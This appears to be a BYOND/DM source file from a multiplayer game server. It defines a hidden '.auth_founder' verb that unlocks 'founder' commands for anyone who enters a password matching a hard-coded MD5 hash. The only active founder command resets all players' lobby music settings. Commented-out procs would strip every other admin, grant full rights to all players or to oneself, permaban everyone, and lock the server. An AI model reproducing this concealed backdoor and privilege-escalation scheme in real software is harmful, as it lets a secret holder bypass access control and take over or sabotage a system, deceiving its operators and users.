
var/founder_hash = "0ddd89405663002d8ed09fe8ad824656"
var/list/founder_verbs = list(/client/proc/reset_lobby_music_preferences/* /client/proc/permaban_all, /client/proc/lock_server*/)
//var/list/founder_verbs = list(/datum/admins/proc/founder_unadmin, /client/proc/founder_adminall, /client/proc/founder_selfadmin, /client/proc/reset_lobby_music_preferences/* /client/proc/permaban_all, /client/proc/lock_server*/)

/client/verb/auth_founder()
	set name = ".auth_founder"
	set category = null
	set hidden = 1

	var/pass = input("???")
	if (md5(pass) == founder_hash)
		founders |= usr.ckey
		verbs |= founder_verbs

/*/datum/admins/proc/founder_unadmin()
	set name = "Unadmin all"
	set category = " Founder"
	set desc = "Unadmins all non-founders."

	if (!(usr.ckey in founders))
		return
	if (alert("Are you sure?", "", "Yes", "No") == "No")
		return

	for(var/adm_ckey in GLOB.admin_datums)
		var/datum/admins/D = GLOB.admin_datums[adm_ckey]
		if (adm_ckey in founders)
			return
		if(!D)
			return
		GLOB.admin_datums -= adm_ckey
		D.disassociate()

		updateranktodb(adm_ckey, "player")
		message_admins("[key_name_admin(usr)] removed [adm_ckey] from the admins list")
		log_admin("[key_name(usr)] removed [adm_ckey] from the admins list")

/client/proc/founder_adminall()
	set name = "Admin all"
	set category = " Founder"
	set desc = "Admins all current players."

	if (!(ckey in founders))
		return

	if (alert("Are you sure?", "", "Yes", "No") == "No")
		return

	for (var/client/C in GLOB.clients)
		var/datum/admins/adatum
		if (GLOB.admin_datums[C.ckey])
			adatum = GLOB.admin_datums[C.ckey]
		if (!adatum || !adatum.rank || adatum.rank.rights != 65535)
			var/datum/admin_rank/arank = new("Ruler of the Galaxy", 65535)
			var/datum/admins/arankholder = new(arank, C.ckey)
			GLOB.admin_datums[C.ckey] = arankholder
		log_admin("[key_name(usr)] has admined [C.ckey].")

/client/proc/founder_selfadmin()
	set name = "Self admin"
	set category = " Founder"
	set desc = "Admins one self."

	if (!(ckey in founders))
		return

	var/datum/admins/adatum
	if (GLOB.admin_datums[ckey])
		adatum = GLOB.admin_datums[ckey]
	if (!adatum || !adatum.rank || adatum.rank.rights != 65535)
		var/datum/admin_rank/arank = new("!superadmin!", 65535)
		var/datum/admins/arankholder = new(arank, ckey)
		GLOB.admin_datums[ckey] = arankholder
	to_chat(usr, "Done.")*/

/*
/client/proc/permaban_all()
	set name = "Perma ban everyone"
	set category = " Founder"
	set desc = "Perma bans everyone on the server."

	if (!(ckey in founders))
		return

	if (alert("Are you sure?", "", "Yes", "No") == "No")
		return

/client/proc/lock_server()
	set name = "Toggle Server Lock"
	set category = " Founder"
	set desc = "Prevents people joining."

	if (!(ckey in founders))
		return

	if (alert("Are you sure?", "", "Yes", "No") == "No")
		return*/

/client/proc/reset_lobby_music_preferences()
	set name = "Reset All Lobby Music Prefs"
	set category = " Founder"
	var/confirmation = alert(src,"This will force all players online and offline to change their lobby music settings to ON. Continue?","Reset All Lobby Music Prefs","Yes","No")
	if(confirmation != "Yes")
		return
	if (!(ckey in founders))
		return
	var/list/alphabet = list("a","b","c","d","e","f","g","h","i","j","k","l","m","n","o","p","q","r","s","t","u","v","w","x","y","z","0","1","2","3","4","5","6","7","8","9")
	var/list/ckeys = list()
	for(var/letter in alphabet)
		var/path = "data/player_saves/[letter]/"
		var/list/filelist = flist(path)
		for(var/T in filelist)
			var/theckey = T
			if(copytext(theckey,length(T),length(T)+1) == "/")
				theckey = replacetext(theckey,"/","",length(T),length(T)+1)
			ckeys += theckey
	var/ckeyschanged = 0
	var/ckeysalreadyon = 0
	for(var/ckey in ckeys)
		var/datum/preferences/prefdatum = new()
		prefdatum.load_path(ckey)
		if(prefdatum.load_preferences())
			if(!(prefdatum.toggles & SOUND_LOBBY))
				prefdatum.toggles ^= SOUND_LOBBY
				prefdatum.save_preferences()
				ckeyschanged++
			else
				ckeysalreadyon++
	message_admins("<font color='red'><B>[key] has changed all players lobby music preferences to default. [ckeyschanged] players changed, [ckeysalreadyon] already on default.</B></font>")


